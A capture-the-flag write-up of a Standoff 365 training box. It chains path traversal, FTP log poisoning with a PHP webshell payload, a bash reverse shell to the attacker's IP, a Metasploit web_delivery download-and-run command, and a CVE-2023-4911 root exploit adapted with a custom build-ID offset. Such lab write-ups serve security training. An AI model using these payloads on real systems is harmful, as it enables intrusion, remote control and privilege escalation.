# www.edu.stf — LFI to RCE to LPE — Standoff 365

<img width="1920" height="579" alt="Screenshot From 2026-04-13 19-53-53" src="https://github.com/user-attachments/assets/81e59bb5-e1f9-46e8-9631-fdbfe7567b3e" />


![](https://img.shields.io/badge/Platform-Standoff_365-purple?style=for-the-badge)
![](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![](https://img.shields.io/badge/OS-Linux-informational?style=for-the-badge&logo=linux&logoColor=white)
![](https://img.shields.io/badge/Category-Web%20%7C%20LFI%20%7C%20PrivEsc-orange?style=for-the-badge)

## Summary

Three flags on a Debian host within the Standoff 365 Bootcamp perimeter. The site at `www.edu.stf` runs Apache with a PHP API endpoint that reads arbitrary files via a `file` parameter — discovered through a JavaScript file in the page source. Path Traversal yields sensitive file reads (**Flag 1**). The box also runs vsftpd 3.0.3 with an empty but readable log file, enabling **FTP log poisoning**: injecting a PHP webshell as an FTP username, then including the poisoned log via LFI to achieve RCE (**Flag 2**). Privilege escalation leverages **CVE-2023-4911 (Looney Tunables)**, but requires manually adding the target's `ld.so` build ID to the exploit script before it will fire (**Flag 3**).

```
Source Code Review → Path Traversal (Flag 1) → FTP Log Poisoning → LFI to RCE (Flag 2)
  → CVE-2023-4911 Looney Tunables (custom build ID) → Root (Flag 3)
```

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | ID |
|:------|:-------|:----------|:---|
| Port scanning & service enum | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Network Service Discovery](https://attack.mitre.org/techniques/T1046/) | `T1046` |
| JavaScript source review | [Reconnaissance](https://attack.mitre.org/tactics/TA0043/) | [Gather Victim Host Info: Client Configurations](https://attack.mitre.org/techniques/T1592/004/) | `T1592.004` |
| Path Traversal / LFI | [Initial Access](https://attack.mitre.org/tactics/TA0001/) | [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) | `T1190` |
| FTP log poisoning | [Persistence](https://attack.mitre.org/tactics/TA0003/) | [Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) | `T1505.003` |
| PHP webshell execution | [Execution](https://attack.mitre.org/tactics/TA0002/) | [Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/) | `T1059.004` |
| Meterpreter via `web_delivery` | [Command and Control](https://attack.mitre.org/tactics/TA0011/) | [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) | `T1105` |
| CVE-2023-4911 buffer overflow | [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) | [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/) | `T1068` |
| SUID `/usr/bin/su` as trigger | [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) | [Abuse Elevation Control: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) | `T1548.001` |

## CVE Reference

| CVE | CVSS 3.1 | Severity | Description |
|:----|:---------|:---------|:------------|
| N/A (app-specific) | **5.3** (est.) | Medium | Path Traversal in `/api/read.php` — unauthenticated arbitrary file read via `file` parameter (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) |
| N/A (app-specific) | **9.8** (est.) | Critical | LFI to RCE via FTP log poisoning — PHP code injection through vsftpd login attempts, executed via the same LFI endpoint (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| [CVE-2023-4911](https://nvd.nist.gov/vuln/detail/CVE-2023-4911) | **7.8** | High | Buffer overflow in glibc `ld.so` dynamic loader (`GLIBC_TUNABLES` parsing) allowing local privilege escalation via any SUID binary (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H|)

> **Note on estimated scores:** Application-specific vulnerabilities without assigned CVEs are scored using the [CVSS 3.1 Calculator](https://www.first.org/cvss/calculator/3.1) based on observed impact and attack vector characteristics.

## Reconnaissance — `T1046` `T1592.004`

### Nmap

```bash
sudo nmap -sC -sV -v 10.124.1.235
```

```
PORT   STATE  SERVICE VERSION
20/tcp closed ftp-data
21/tcp open   ftp     vsftpd 3.0.3
22/tcp open   ssh     OpenSSH 9.2p1 Debian 2+deb12u1
80/tcp open   http    Apache httpd 2.4.57 ((Debian))
|_http-title: Heavy Logistics
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

Three services in play: FTP (vsftpd 3.0.3), SSH, and Apache on 80. Anonymous FTP login is denied. Let's start with the web server.

### Web Enumeration

<img width="1919" height="882" alt="web_2_web_site" src="https://github.com/user-attachments/assets/19b630f3-92c1-4d19-b672-4731f65e4faa" />

The landing page is a logistics company template — nothing immediately suspicious in the UI. However, a closer look at the source code reveals a JavaScript file worth reading:

<img width="1919" height="881" alt="web_2_web_site_source_code" src="https://github.com/user-attachments/assets/5d8b4cff-0b90-4c4d-b192-7350e914fd45" />

```javascript
setInterval(() => {
    fetch('/api/read.php?file=/opt/cpu.txt')
        .then(response => response.text())
        .then(data => { console.log(data); })
        .catch(error => { console.error('Fetch error:', error); });
}, 10000);
```

This script polls `/api/read.php` every 10 seconds, passing a full filesystem path via the `file` parameter. No sanitization, no path validation — just raw file inclusion from a GET parameter. This is textbook Path Traversal, and it's about to become our entry point for everything that follows.

## Path Traversal — `T1190`

### Flag 1 — Arbitrary File Read

First, confirm the endpoint works as advertised:

<img width="853" height="413" alt="web_2_path" src="https://github.com/user-attachments/assets/b9fe5762-05f6-4f85-96cd-cc4b9ba97119" />

The file reads successfully. Now let's go after the first flag:

```
/api/read.php?file=/etc/pt.flag
```

<img width="897" height="246" alt="web_2_first_flag" src="https://github.com/user-attachments/assets/e08d8782-58af-4035-b95a-84c8dcde6b78" />

> **Flag 1** captured via unauthenticated Path Traversal.

## LFI to RCE — `T1505.003` `T1059.004`

### FTP Log Poisoning

The challenge hints mention credentials hidden in logs. Standard log paths (`/var/log/syslog`, `/var/log/vsftpd.log`, `/var/log/xferlog`, Apache logs) all return 200 but with empty bodies — the logs exist but contain nothing yet.

This is actually the key insight. An empty, readable log file is not a dead end — it's an **invitation to write something into it**. The technique is called **log poisoning**: if we can inject PHP code into a log file and then include that log via our LFI endpoint, the PHP interpreter will execute our injected code.

vsftpd logs failed authentication attempts, including the username. If we attempt an FTP login with a PHP payload as the username, that payload gets written to the log file verbatim.

Connect to FTP and "authenticate" with a webshell as the username:

```php
<?php system($_GET['cmd']); ?>
```

The login fails (as intended), but vsftpd faithfully records the attempt — PHP payload and all — into its log file.

Now include the poisoned log via the LFI endpoint, appending a command parameter:

```
/api/read.php?file=/var/log/vsftpd.log&cmd=id
```

<img width="1919" height="959" alt="web_2_lfi_to_rce" src="https://github.com/user-attachments/assets/00646d72-e982-4814-b904-742890376d52" />

The log shows the failed login entry, and — critically — the `id` command output is rendered inline. We have **full RCE** through log poisoning.

### Flag 2 — Reverse Shell

Re-poison the log with a fresh PHP payload if needed, then execute a bash reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/10.127.205.39/7777 0>&1'
```

<img width="1919" height="961" alt="web_2_second_flag" src="https://github.com/user-attachments/assets/332c0e8e-db68-4eeb-8a46-05090cd02839" />

> **Flag 2** captured via FTP log poisoning → LFI → RCE.

## Privilege Escalation — `T1068` `T1548.001` `T1105`

### Shell Stabilization

Before escalating, stabilize the shell for a sane working environment:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo && fg
export TERM=xterm-256color
reset
```

### CVE-2023-4911 (Looney Tunables) — The Build ID Problem

The hint points to CVE-2023-4911 — the same Looney Tunables vulnerability from the `library.edu.stf` machine. Simple enough, right? Not this time.

**Attempt 1 — Compile on target:** No `gcc` available.

```bash
www-data@www:/tmp$ gcc -v
bash: gcc: command not found
```

**Attempt 2 — Cross-compile and transfer:** Pre-compiled binaries from various GitHub repos fail silently or crash.

**Attempt 3 — Metasploit module:** Create a proper Meterpreter session first using `web_delivery`:

```bash
msf6> use exploit/multi/script/web_delivery
msf6 exploit(...)> set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(...)> set target 1
msf6 exploit(...)> set lhost tun0
msf6 exploit(...)> run
```

```
[*] Run the following command on the target machine:
wget -qO mqqQvKQv --no-check-certificate http://10.127.205.39:9999/VfQioFFmuR;
  chmod +x mqqQvKQv; ./mqqQvKQv& disown
[*] Meterpreter session 1 opened (10.127.205.39:4444 -> 10.124.1.219:61481)
```

Then run the Looney Tunables module:

```bash
msf6> use exploit/linux/local/glibc_tunables_priv_esc
msf6 exploit(...)> set session 1
msf6 exploit(...)> run
```

```
[+] The target appears to be vulnerable. The glibc version (2.36-9+deb12u2)
    found on the target appears to be vulnerable
Error: The build ID found is not exploitable
```

Metasploit confirms the target is vulnerable but **doesn't have the correct offsets** for this specific `ld.so` build. This is the trap that makes this "Easy" box deceptively time-consuming.

### The Solution — KernelKrise's Exploit with Custom Build ID

After testing five different exploit implementations, the version from [KernelKrise](https://github.com/KernelKrise/CVE-2023-4911) proves to be the right tool — but it requires manual configuration.

First run reveals the problem:

```bash
www-data@www:/tmp$ python3 gun-acme.py
```

```
[i] ld.so build id = 35b410ef6ccdab4a7edeb2fdf801b8b65e8d19cc
error: no target info found for build id 35b410ef6ccdab4a7edeb2fdf801b8b65e8d19cc
```

The exploit hardcodes a lookup table mapping `ld.so` build IDs to memory offsets. This target's build ID isn't in the table. The fix: add it manually with the correct offset value:

```python
TARGETS = {
    "35b410ef6ccdab4a7edeb2fdf801b8b65e8d19cc": 561,
    # ...existing entries...
}
```

> **Why 561?** The offset determines where the overflow payload lands relative to the stack. Each `ld.so` build has a unique memory layout — the offset must match exactly, or the exploit corrupts the wrong address and segfaults instead of spawning a shell.

### Flag 3 — Root

```bash
www-data@www:/tmp$ python3 gun-acme.py

      $$$ glibc ld.so (CVE-2023-4911) exploit $$$
            -- by blasty <peter@haxx.in> --

[i] ld.so build id = 35b410ef6ccdab4a7edeb2fdf801b8b65e8d19cc
[i] __libc_start_main = 0x27200
[i] using hax path b'\x08' at offset -8
[i] wrote patched libc.so.6
[i] using stack addr 0x7ffe1010100c
..............................................
sh-5.2# ** ohh... looks like we got a shell? **

id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

<img width="1919" height="962" alt="web_2_third_flag" src="https://github.com/user-attachments/assets/df92a3de-4e34-4521-8280-3ccfc161593f" />

> **Flag 3** captured. Full root access achieved.

## Lessons Learned

1. **JavaScript files are recon goldmines.** The entire attack chain started from a JS file that exposed a vulnerable API endpoint with a `file` parameter. Always review every script loaded by the page — not just the HTML source.

2. **Empty log files are not dead ends — they're blank canvases.** A readable but empty log file via LFI is the perfect setup for log poisoning. If you can read it and the service writes user-controlled input to it, you can weaponize it.

3. **FTP log poisoning is a reliable LFI-to-RCE primitive.** vsftpd logs the username from failed login attempts verbatim — including PHP tags. Any LFI endpoint that can reach the FTP log becomes a webshell with a single failed login.

4. **CVE-2023-4911 exploits are build-ID-specific.** Unlike most privilege escalation exploits that "just work," Looney Tunables requires exact memory offsets for the target's `ld.so` build. When an exploit fails with "build ID not found," don't discard it — the error message itself contains the build ID you need to add. Understanding *why* the exploit needs this (buffer overflow targeting specific stack offsets) is the key to adapting it.

5. **When `gcc` is missing, think laterally.** No compiler on the target doesn't mean the exploit is unusable. Python-based exploit variants, cross-compilation, or Metasploit's `web_delivery` for session creation are all viable alternatives. In this case, a Python exploit was the path of least resistance.

---

*Writeup by [@alfabuster](https://github.com/alfabuster)*
